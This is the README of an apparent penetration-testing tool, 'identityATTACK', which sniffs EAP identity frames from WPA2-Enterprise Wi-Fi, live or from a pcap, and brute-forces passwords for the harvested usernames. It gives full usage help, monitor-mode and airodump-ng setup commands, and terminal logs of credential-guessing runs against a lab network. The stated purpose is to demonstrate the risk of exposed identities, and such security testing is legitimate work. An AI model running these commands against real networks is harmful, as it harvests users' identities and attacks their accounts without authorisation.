# identityATTACK
The goal of identityATTACK is to ingest EAP frames and pull out identity information and then perform an online brute force attack against those accounts to demonstrate the issue of not utilising the anonymous identity options. 

## Usage
### Help
```
┌──(vagrant㉿vagrant-kali-rolling-amd64)-[~/identityATTACK]
└─$ sudo python3 identityATTACK.py -s rogue -m wlan1 -i wlan0 -p passwd.lst -l 30 -t 10 -c 36 -h
usage: identityATTACK.py [-h] [--version] [-b BSSID] [-D] [-f FILENAME] [-m MONITOR_INTERFACE]
                         [-l LIVE_CAPTURE_WINDOW] [-c CHANNEL] [-t TIMEOUT] [-e {MD5,PEAP}] [-s SSID]
                         [-i INTERFACE] [-p PASS_FILE]

Automated online WPA2-Enterprise Brute Forcing Tool

optional arguments:
  -h, --help            show this help message and exit
  --version             show program's version number and exit
  -b BSSID, --bssid BSSID
                        select target bssid (Default: 00:11:22:33:44:00)
  -D, --debug           enable debug mode

  Specify target source for extraction

  -f FILENAME, --filename FILENAME
                        extract eap.identity from pcap
  -m MONITOR_INTERFACE, --monitor MONITOR_INTERFACE
                        set interface to monitor for eap.identity on

  Control settings for live extraction

  -l LIVE_CAPTURE_WINDOW, --live LIVE_CAPTURE_WINDOW
                        specify the timeout for live capture window (Default: 360)
  -c CHANNEL, --channel CHANNEL
                        specify channel monitor

  Control settings for brute force attacks

  -t TIMEOUT, --timeout TIMEOUT
                        specify the timeout delay for password guessing (Default: 30)
  -e {MD5,PEAP}, --eap {MD5,PEAP}
                        Control EAP method to use (Default: PEAP)
  -s SSID, --ssid SSID  specify ssid
  -i INTERFACE, --interface INTERFACE
                        set interface to use
  -p PASS_FILE, --passfile PASS_FILE
                        specify wordlist
                                                                                                                    
┌──(vagrant㉿vagrant-kali-rolling-amd64)-[~/identityATTACK]
└─$
```

### Example
Setup the listening interface into monitor mode
```
sudo nmcli device set wlan0 managed no
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up
```

#### Extracting EAP identities from PCAP and brute-force the extracted identities
**note:** when in pcap extraction mode (`-f`), one wireless adaptor is required to be connected to the test system. 
```
┌──(vagrant㉿vagrant-kali-rolling-amd64)-[~/identityATTACK]
└─$ sudo python3 identityATTACK.py -s rogue -i wlan1 -f ../wpa2-enterprise_handshake_2.pcap -p passwd.lst
WARNING: can't import layer ipsec: cannot import name 'gcd' from 'fractions' (/usr/lib/python3.9/fractions.py)
[+] Extracting EAP identity from pcap file: ../wpa2-enterprise_handshake_2.pcap
[+] successfully extracted the following EAP identity:
[-]  test
[-]  udisjshsok
[-]  wish
[-]
[+] Creating wpa_supplicant.conf file: /home/vagrant/identityATTACK/tmp/wpa_supplicant.conf
[+] Trying username "test" with password "Password1"
[+] credentials failed!
[+] Trying username "udisjshsok" with password "Password1"
[+] credentials failed!
[+] Trying username "wish" with password "Password1"
[+] credentials failed!
[+] Trying username "test" with password "Password2"
[+] credentials failed!
[+] Trying username "udisjshsok" with password "Password2"
[+] credentials failed!
[+] Trying username "wish" with password "Password2"
[+] credentials failed!
```

#### Capturing EAP identities live and brute-forcing the identities
**note:** when in live mode (`-m`), two wireless adaptors are required to be connected to the testing system at the same.
##### Targeted EAP monitoring and brute-forcing
```
┌──(vagrant㉿vagrant-kali-rolling-amd64)-[~/identityATTACK]
└─$ sudo python3 identityATTACK.py -s rogue -m wlan1 -i wlan0 -p passwd.lst -l 30 -t 10 -c 36
WARNING: can't import layer ipsec: cannot import name 'gcd' from 'fractions' (/usr/lib/python3.9/fractions.py)
[+] Configuring monitor adapter: wlan1
[+] Monitoring for eap.identity frames on interface "wlan1" for: 30s
[+] Added new identity to brute force pool: fh
[+] Already found "fh", skipping...
[+] Trying username "fh" with password "Password1"
[+] credentials failed!
[+] Trying username "fh" with password "Password2"
[+] Monitoring capture window has finished, waiting for brute force attacks to complete
[+] credentials failed!
[+] Adding "fh" to tested list
[+] During the capture, the following accounts were identified and tested:
[-]    fh
[+] Resetting adapter: wlan1
                                                                                                                    
┌──(vagrant㉿vagrant-kali-rolling-amd64)-[~/identityATTACK]
└─$ 

```

##### Auto-channel EAP monitoring and brute-forcing
###### Terminal 1
```
sudo airodump-ng wlan1 --band abg --essid rogue
```
######Terminal 2
```
┌──(vagrant㉿vagrant-kali-rolling-amd64)-[~/identityATTACK]
└─$ sudo python3 identityATTACK.py -s rogue -m wlan1 -i wlan0 -p passwd.lst -l 30 -t 10 -c 36
WARNING: can't import layer ipsec: cannot import name 'gcd' from 'fractions' (/usr/lib/python3.9/fractions.py)
[+] Configuring monitor adapter: wlan1
[+] Monitoring for eap.identity frames on interface "wlan1" for: 30s
[+] Added new identity to brute force pool: fh
[+] Already found "fh", skipping...
[+] Trying username "fh" with password "Password1"
[+] credentials failed!
[+] Trying username "fh" with password "Password2"
[+] Monitoring capture window has finished, waiting for brute force attacks to complete
[+] credentials failed!
[+] Adding "fh" to tested list
[+] During the capture, the following accounts were identified and tested:
[-]    fh
[+] Resetting adapter: wlan1
                                                                                                                    
┌──(vagrant㉿vagrant-kali-rolling-amd64)-[~/identityATTACK]
└─$ 

```
